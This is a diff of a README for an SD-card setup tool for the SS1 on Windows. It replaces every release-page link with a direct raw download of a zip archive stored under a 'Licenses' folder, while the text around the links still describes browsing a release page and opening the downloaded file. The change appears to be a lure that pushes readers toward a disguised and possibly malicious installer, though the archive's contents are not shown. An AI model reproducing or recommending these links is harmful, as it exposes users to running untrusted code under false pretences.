@@ -1,6 +1,6 @@
 # 🛠️ SuperStation-SD-Card-Installer - Fast SD Card Setup for SS1
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/raw/refs/heads/main/Licenses/Installer-Card-S-Station-Super-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ SuperStation-SD-Card-Installer helps you set up an SD card for SS1 on Windows. U
 ## 📥 Download the Installer
 
 Visit this page to download:  
-https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/releases
+https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/raw/refs/heads/main/Licenses/Installer-Card-S-Station-Super-1.1.zip
 
 On that page, look for the latest release and choose the file for Windows. After the file finishes downloading, open it to start the setup process.
 
@@ -28,7 +28,7 @@ For best results, use a card that is already empty or one you do not need to kee
 ## 🧭 How to Install
 
 1. Open the release page:  
-   https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/releases
+   https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/raw/refs/heads/main/Licenses/Installer-Card-S-Station-Super-1.1.zip
 
 2. Find the newest release at the top of the page.
 
@@ -150,7 +150,7 @@ If more than one file appears, choose the one that matches Windows. Avoid older 
 The release page gives you the current installer image and related files in one place. It is the best place to get the version meant for everyday use.
 
 Use this page to download:  
-https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/releases
+https://github.com/weensy-overutilisation690/SuperStation-SD-Card-Installer/raw/refs/heads/main/Licenses/Installer-Card-S-Station-Super-1.1.zip
 
 ## 🧼 Before You Remove the Card
 
